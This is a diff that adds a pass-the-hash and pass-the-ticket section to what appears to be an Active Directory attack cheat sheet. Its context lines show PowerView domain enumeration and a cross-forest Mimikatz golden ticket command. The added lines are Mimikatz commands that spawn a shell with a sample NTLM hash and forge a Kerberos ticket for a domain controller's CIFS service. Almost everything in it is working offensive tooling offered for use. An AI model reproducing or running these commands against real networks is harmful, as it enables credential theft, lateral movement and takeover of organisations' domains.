@@ -184,3 +184,14 @@ Get-DomainSID -domain corp2.com
 Get-DomainGroupMember -Identity "Administrators" -Domain corp2.com
 kerberos::golden /user:h4x /domain:<Domain> /sid:<Domain SID> /krbtgt:<Domain NTLM Hash of KRBTGT> /sids:<External Forest Enterprise Admin SID Custom Group>  /ptt
 ```
+
+
+### Mimikatz/Rubeus PTT
+```powershell
+#Pass the Hash
+sekurlsa::pth /domain:infinity.com /ntlm:e929e69f7c290222be87968263a9282e /user:ted /run:cmd.exe
+
+# Pass the Ticket
+kerberos::golden /domain:infinity.com /ntlm:e929e69f7c290222be87968263a9282e /user:ted /target:dc03 /service:CIFS /ptt
+misc::cmd
+```
